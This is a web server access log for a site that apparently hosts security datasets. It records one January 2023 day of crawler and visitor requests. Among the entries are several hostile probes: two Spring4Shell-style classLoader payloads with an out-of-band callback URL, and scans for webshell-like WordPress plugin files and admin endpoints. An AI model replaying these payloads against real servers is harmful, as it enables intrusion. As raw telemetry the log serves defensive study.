185.191.171.16 - - [07/Jan/2023:09:26:20 -0800] "GET /robots.txt HTTP/1.1" 200 350 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
185.191.171.1 - - [07/Jan/2023:09:26:20 -0800] "GET /Datasets%20Description/HTML_Bro_log_3/ssl.html HTTP/1.1" 200 1847 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
207.154.208.168 - - [07/Jan/2023:09:26:51 -0800] "GET /maccdc2012/tunnel.log.gz HTTP/1.1" 200 5292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36" 
196.65.230.220 - - [07/Jan/2023:09:33:45 -0800] "GET / HTTP/1.1" 200 13195 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" 
196.92.7.82 - - [07/Jan/2023:09:33:45 -0800] "GET /css/style.css HTTP/1.1" 404 338 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" 
196.65.230.220 - - [07/Jan/2023:09:33:46 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27903 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" 
196.92.7.82 - - [07/Jan/2023:09:33:46 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7543 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" 
196.92.7.82 - - [07/Jan/2023:09:33:47 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 700 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0" 
20.83.166.65 - - [07/Jan/2023:09:35:07 -0800] "GET /data/admin/allowurl.txt HTTP/1.1" 301 521 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
20.83.166.65 - - [07/Jan/2023:09:35:07 -0800] "GET /data/admin/allowurl.txt HTTP/1.1" 404 338 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
206.47.249.246 - - [07/Jan/2023:09:38:10 -0800] "GET /self.logs/error.log.2019-04-23.gz HTTP/1.1" 304 290 "-" "Mozilla/4.0 (compatible;)" 
185.191.171.7 - - [07/Jan/2023:09:45:34 -0800] "GET /Datasets%20Description/HTML_Bro_log_1/weird.html HTTP/1.1" 200 1910 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
114.119.136.72 - - [07/Jan/2023:09:48:09 -0800] "GET /self.logs/error.log.2021-01-01 HTTP/1.1" 200 361 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.135.174 - - [07/Jan/2023:09:49:48 -0800] "GET /self.logs/error.log.2020-11-20 HTTP/1.1" 200 361 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.20.105 - - [07/Jan/2023:09:56:21 -0800] "GET / HTTP/1.1" 200 13159 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
39.173.107.108 - - [07/Jan/2023:09:58:28 -0800] "GET / HTTP/1.1" 200 13159 "-" "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Mobile Safari/537.36" 
39.173.107.111 - - [07/Jan/2023:09:58:33 -0800] "GET /css/style.css HTTP/1.1" 404 301 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Mobile Safari/537.36" 
123.125.109.93 - - [07/Jan/2023:10:09:46 -0800] "GET / HTTP/1.1" 200 13158 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
182.65.216.54 - - [07/Jan/2023:10:11:38 -0800] "GET / HTTP/1.1" 200 13195 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1" 
182.65.216.54 - - [07/Jan/2023:10:11:39 -0800] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 338 "-" "MobileSafari/8614.2.9.0.10 CFNetwork/1399 Darwin/22.1.0" 
182.65.216.54 - - [07/Jan/2023:10:11:39 -0800] "GET / HTTP/1.1" 200 13195 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1" 
182.65.216.54 - - [07/Jan/2023:10:11:39 -0800] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 315 "-" "MobileSafari/8614.2.9.0.10 CFNetwork/1399 Darwin/22.1.0" 
182.65.216.54 - - [07/Jan/2023:10:11:40 -0800] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 315 "-" "MobileSafari/8614.2.9.0.10 CFNetwork/1399 Darwin/22.1.0" 
182.65.216.54 - - [07/Jan/2023:10:11:40 -0800] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 338 "-" "MobileSafari/8614.2.9.0.10 CFNetwork/1399 Darwin/22.1.0" 
182.65.216.54 - - [07/Jan/2023:10:11:40 -0800] "GET /apple-touch-icon.png HTTP/1.1" 404 315 "-" "MobileSafari/8614.2.9.0.10 CFNetwork/1399 Darwin/22.1.0" 
182.65.216.54 - - [07/Jan/2023:10:11:40 -0800] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 315 "-" "MobileSafari/8614.2.9.0.10 CFNetwork/1399 Darwin/22.1.0" 
182.65.216.54 - - [07/Jan/2023:10:11:40 -0800] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 315 "-" "MobileSafari/8614.2.9.0.10 CFNetwork/1399 Darwin/22.1.0" 
182.65.216.54 - - [07/Jan/2023:10:11:40 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 700 "-" "MobileSafari/8614.2.9.0.10 CFNetwork/1399 Darwin/22.1.0" 
182.65.216.54 - - [07/Jan/2023:10:11:40 -0800] "GET /apple-touch-icon.png HTTP/1.1" 404 315 "-" "MobileSafari/8614.2.9.0.10 CFNetwork/1399 Darwin/22.1.0" 
182.65.216.54 - - [07/Jan/2023:10:11:42 -0800] "GET / HTTP/1.1" 200 13195 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15" 
182.65.216.54 - - [07/Jan/2023:10:11:42 -0800] "GET /twitter-icon.png HTTP/1.1" 200 27903 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15" 
182.65.216.54 - - [07/Jan/2023:10:11:42 -0800] "GET /css/style.css HTTP/1.1" 404 338 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15" 
182.65.216.54 - - [07/Jan/2023:10:11:43 -0800] "GET /GitHub-Mark.png HTTP/1.1" 200 7543 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15" 
182.65.216.54 - - [07/Jan/2023:10:11:44 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 700 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15" 
49.7.20.105 - - [07/Jan/2023:10:29:08 -0800] "GET / HTTP/1.1" 200 13158 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
171.22.28.11 - - [07/Jan/2023:10:57:58 -0800] "GET /wp-content/plugins/wpputty/wpputty.php HTTP/1.1" 404 338 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" 
171.22.28.11 - - [07/Jan/2023:10:58:06 -0800] "GET /wp-content/plugins/wpyii2/wpyii2.php HTTP/1.1" 404 338 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" 
171.22.28.11 - - [07/Jan/2023:10:58:57 -0800] "GET /wp-content/plugins/wpzip/wpzip.php HTTP/1.1" 404 338 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" 
171.22.28.11 - - [07/Jan/2023:10:59:09 -0800] "GET /wp-content/plugins/dos2unix/dos2unix.php HTTP/1.1" 404 338 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" 
49.7.20.105 - - [07/Jan/2023:11:01:51 -0800] "GET / HTTP/1.1" 200 13159 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
207.46.13.180 - - [07/Jan/2023:11:18:07 -0800] "GET /self.logs/access.log.2017-01-24.gz HTTP/1.1" 200 17123 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
49.7.20.105 - - [07/Jan/2023:11:34:46 -0800] "GET / HTTP/1.1" 200 13159 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
51.222.253.16 - - [07/Jan/2023:11:36:49 -0800] "GET /self.logs/2015/?C=M;O=A HTTP/1.1" 200 7672 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
23.106.219.196 - - [07/Jan/2023:11:42:40 -0800] "GET / HTTP/1.1" 200 13196 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
23.106.219.196 - - [07/Jan/2023:11:42:40 -0800] "GET /data HTTP/1.1" 404 338 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
23.106.219.196 - - [07/Jan/2023:11:42:42 -0800] "GET /ftp://download.iwlab.foi.se/dataset/ HTTP/1.1" 404 338 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
23.106.219.236 - - [07/Jan/2023:11:42:44 -0800] "GET / HTTP/1.1" 301 475 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
23.106.219.236 - - [07/Jan/2023:11:42:45 -0800] "GET / HTTP/1.1" 200 13196 "http://secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
23.106.219.196 - - [07/Jan/2023:11:42:46 -0800] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 13811600 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
23.106.219.196 - - [07/Jan/2023:11:43:16 -0800] "GET /maccdc2012/conn.log.gz HTTP/1.1" 200 10548500 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
23.106.219.196 - - [07/Jan/2023:11:43:47 -0800] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930931 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
23.106.219.196 - - [07/Jan/2023:11:43:51 -0800] "GET /maccdc2012/dhcp.log.gz HTTP/1.1" 200 44987 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
23.106.219.196 - - [07/Jan/2023:11:43:53 -0800] "GET /honeypot/honeypot.json.zip HTTP/1.1" 200 13157520 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
23.106.219.196 - - [07/Jan/2023:11:44:23 -0800] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1471 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
23.106.219.196 - - [07/Jan/2023:11:44:24 -0800] "GET /auth.log/auth.log.gz HTTP/1.1" 200 615689 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
23.106.219.196 - - [07/Jan/2023:11:44:28 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6607389 "http://www.secrepo.com" "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36" 
193.226.177.45 - - [07/Jan/2023:11:49:13 -0800] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 127727 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36" 
34.133.88.216 - - [07/Jan/2023:12:00:44 -0800] "GET /ads.txt HTTP/1.1" 301 452 "-" "PhantomBot/1.0" 
34.133.88.216 - - [07/Jan/2023:12:00:44 -0800] "GET /ads.txt HTTP/1.1" 404 301 "-" "PhantomBot/1.0" 
49.7.20.105 - - [07/Jan/2023:12:11:38 -0800] "GET / HTTP/1.1" 200 13159 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
20.191.45.212 - - [07/Jan/2023:12:16:09 -0800] "GET / HTTP/1.1" 200 13195 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
20.191.45.212 - - [07/Jan/2023:12:16:09 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 700 "http://www.secrepo.com/bootstrap/img/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
40.88.21.235 - - [07/Jan/2023:12:28:55 -0800] "GET / HTTP/1.1" 200 13195 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
40.88.21.235 - - [07/Jan/2023:12:28:55 -0800] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 700 "http://www.secrepo.com/bootstrap/img/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)" 
212.227.212.11 - - [07/Jan/2023:12:34:35 -0800] "GET / HTTP/1.1" 301 475 "-" "python-requests/2.27.1" 
212.227.212.11 - - [07/Jan/2023:12:34:36 -0800] "GET / HTTP/1.1" 429 487 "-" "python-requests/2.27.1" 
20.220.196.169 - - [07/Jan/2023:12:34:55 -0800] "GET / HTTP/1.1" 200 13196 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
183.197.255.159 - - [07/Jan/2023:12:38:05 -0800] "POST / HTTP/1.1" 301 438 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.197.95.142 - - [07/Jan/2023:12:38:06 -0800] "GET /?class.module.classLoader.resources.context.configFile=http://cerhk53pehfg797ufi20psb3tzbs4bpxe.oast.me&class.module.classLoader.resources.context.configFile.content.aaa=xxx HTTP/1.1" 301 788 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.197.255.154 - - [07/Jan/2023:12:38:07 -0800] "POST / HTTP/1.1" 301 438 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
183.199.219.53 - - [07/Jan/2023:12:38:09 -0800] "GET /?class.module.classLoader.resources.context.configFile=https://cerhk53pehfg797ufi20kgkni5g1xzmbk.oast.me&class.module.classLoader.resources.context.configFile.content.aaa=xxx HTTP/1.1" 301 790 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
49.7.20.105 - - [07/Jan/2023:12:54:40 -0800] "GET / HTTP/1.1" 200 13159 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
207.46.13.45 - - [07/Jan/2023:13:01:35 -0800] "GET /self.logs/access.log.2022-08-24.gz HTTP/1.1" 200 16136 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
51.222.253.11 - - [07/Jan/2023:13:17:01 -0800] "GET /robots.txt HTTP/1.1" 301 439 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
51.222.253.11 - - [07/Jan/2023:13:17:01 -0800] "GET /robots.txt HTTP/1.1" 200 343 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
34.125.32.236 - - [07/Jan/2023:13:17:02 -0800] "GET /data HTTP/1.1" 404 338 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 PTST/221228.183022" 
34.171.141.170 - - [07/Jan/2023:13:19:10 -0800] "GET /data HTTP/1.1" 404 338 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 PTST/221228.183022" 
17.241.219.163 - - [07/Jan/2023:13:31:22 -0800] "GET /robots.txt HTTP/1.1" 200 343 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
17.241.219.163 - - [07/Jan/2023:13:31:23 -0800] "GET /Datasets%20Description/HTML_Bro_log_3/dpd.html HTTP/1.1" 200 1594 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)" 
117.27.152.250 - - [07/Jan/2023:13:37:46 -0800] "GET / HTTP/1.1" 200 13196 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
49.7.20.105 - - [07/Jan/2023:13:38:43 -0800] "GET / HTTP/1.1" 200 13159 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
117.27.152.250 - - [07/Jan/2023:13:39:21 -0800] "GET / HTTP/1.1" 200 13196 "http://www.secrepo.com" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
114.119.141.93 - - [07/Jan/2023:13:44:25 -0800] "GET /self.logs/error.log.2020-08-19 HTTP/1.1" 200 361 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
45.33.58.192 - - [07/Jan/2023:13:53:48 -0800] "GET /wp-content/themes/seotheme/db.php?u HTTP/1.1" 301 545 "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" 
45.33.58.192 - - [07/Jan/2023:13:54:02 -0800] "GET /wp-content/themes/seotheme/db.php?u HTTP/1.1" 429 478 "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" 
157.55.39.47 - - [07/Jan/2023:14:07:25 -0800] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 292 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
49.7.20.105 - - [07/Jan/2023:14:21:13 -0800] "GET / HTTP/1.1" 200 13159 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
43.228.126.230 - - [07/Jan/2023:14:32:55 -0800] "GET /index.php?case=tool&act=cut_image HTTP/1.1" 404 338 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
157.55.39.47 - - [07/Jan/2023:14:38:47 -0800] "GET /maccdc2012/http.log.gz HTTP/1.1" 301 519 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
193.226.177.45 - - [07/Jan/2023:14:48:02 -0800] "GET /maccdc2012/ftp.log.gz HTTP/1.1" 200 127727 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36" 
183.197.254.28 - - [07/Jan/2023:15:03:13 -0800] "GET /backend/backend/auth/signin HTTP/1.1" 301 492 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54" 
49.7.20.105 - - [07/Jan/2023:15:03:18 -0800] "GET / HTTP/1.1" 200 13159 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.135.96 - - [07/Jan/2023:15:27:02 -0800] "GET /self.logs/error.log.2020-08-23 HTTP/1.1" 429 478 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.146.206 - - [07/Jan/2023:15:29:06 -0800] "GET /self.logs/error.log.2020-04-01 HTTP/1.1" 200 361 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.70.177 - - [07/Jan/2023:15:41:38 -0800] "GET /Datasets%20Description/HTML_Bro_log_2/ssl.html HTTP/1.1" 200 1870 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
49.7.20.105 - - [07/Jan/2023:15:44:15 -0800] "GET / HTTP/1.1" 200 13159 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
185.191.171.38 - - [07/Jan/2023:15:46:59 -0800] "GET /robots.txt HTTP/1.1" 301 458 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
185.191.171.38 - - [07/Jan/2023:15:46:59 -0800] "GET /robots.txt HTTP/1.1" 200 350 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
185.191.171.9 - - [07/Jan/2023:15:46:59 -0800] "GET /Datasets%20Description/Network/smtp.html HTTP/1.1" 301 514 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
185.191.171.22 - - [07/Jan/2023:15:46:59 -0800] "GET /robots.txt HTTP/1.1" 200 350 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
185.191.171.45 - - [07/Jan/2023:15:46:59 -0800] "GET /Datasets%20Description/Network/smtp.html HTTP/1.1" 200 1610 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
114.119.136.95 - - [07/Jan/2023:15:53:32 -0800] "GET /self.logs/error.log.2020-10-03 HTTP/1.1" 200 361 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.151.1 - - [07/Jan/2023:16:15:28 -0800] "GET /self.logs/error.log.2020-01-13 HTTP/1.1" 200 361 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
49.7.20.105 - - [07/Jan/2023:16:23:46 -0800] "GET / HTTP/1.1" 200 13158 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
185.191.171.38 - - [07/Jan/2023:16:25:08 -0800] "GET /Datasets%20Description/HTML_Bro_log_2/irc.html HTTP/1.1" 200 1744 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)" 
113.90.38.43 - - [07/Jan/2023:16:30:37 -0800] "GET /favicon.ico HTTP/1.1" 200 401 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36" 
